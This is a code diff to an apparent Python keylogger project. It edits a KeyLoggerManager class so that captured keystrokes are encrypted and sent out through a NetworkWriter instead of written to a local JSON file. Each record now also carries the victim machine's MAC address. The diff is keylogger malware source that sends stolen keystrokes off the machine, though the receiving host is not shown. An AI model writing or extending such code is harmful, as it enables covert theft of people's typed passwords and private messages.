@@ -1,8 +1,8 @@
-from writer.json_writer import JsonWriter
+from writer import NetworkWriter
 import time
 from getmac import get_mac_address as gma
-from encryption.shaul_encryption import Encryption
-from key_logger_service.key_Logger_service import KeyLoggerService
+from encryption import ShaulEncryption as Encryption
+from key_logger_service import KeyLoggerService
 import threading
 
 
@@ -27,18 +27,19 @@ class KeyLoggerManager:
     def __write(self, data_to_write: dict) -> bool:
 
         try:
-            w = JsonWriter()
-            w.write(data=data_to_write, target_id=self.id)
+            w = NetworkWriter()
+            w.write(data=data_to_write)
             return True
-        except:
-            print("Error in __write function")
+        except Exception as e:
+            print("Error in __write function", str(e))
 
     def __get_and_add_data_to_file(self):
         encrypted_kd = self.__encrypt(self.key_logger_service.get)
         date_time = self.__get_formatted_time()
         data_for_file = {
-            "time": date_time,
-            "data": encrypted_kd
+            "time": str(date_time),
+            "data": encrypted_kd,
+            "mac_address": str(self.id)
         }
 
         self.__write(data_to_write=data_for_file)          
